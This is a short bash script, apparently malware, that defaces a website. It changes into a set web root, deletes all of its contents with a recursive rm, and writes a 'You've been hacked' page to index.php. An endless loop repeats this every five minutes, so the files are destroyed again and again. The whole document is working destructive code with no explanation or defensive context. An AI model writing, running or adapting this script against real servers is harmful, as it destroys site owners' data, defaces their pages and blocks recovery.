#!/usr/bin/env bash

declare -r WEBROOT="/path/to/web/root"

declare -r RANSOM_MESSAGE="<title>Hacked</title><h2>You've been hacked.</h2>"

function cleardir() {
    echo "Clearing $1"
    echo -e "\n"

    [ ! -e "$1" ] && echo "The '$1' path does not exist." && return

    [ ! -d "$1" ] && echo "The '$1' is not a folder." && return

    [ -e "$1" ] && [ -d "$1" ] && cd "$1"

    [ "$PWD" != "$1" ] && echo "Failed to change directory to $1." && return

    [ "$(ls $1)" ] && rm * -r && echo "Ran command to delete all contents of $1."

    [ "$(ls $1)" ] && echo "Failed to delete contents of $1." && return

    [ ! -s "$1" ] && echo "Successfully deleted contents of $1."

    echo -e "\n"
}

function action() {

    cleardir $WEBROOT
    echo $RANSOM_MESSAGE >"$WEBROOT/index.php"
}

while [ 1 -eq 1 ]; do

    action

    sleep 300
done
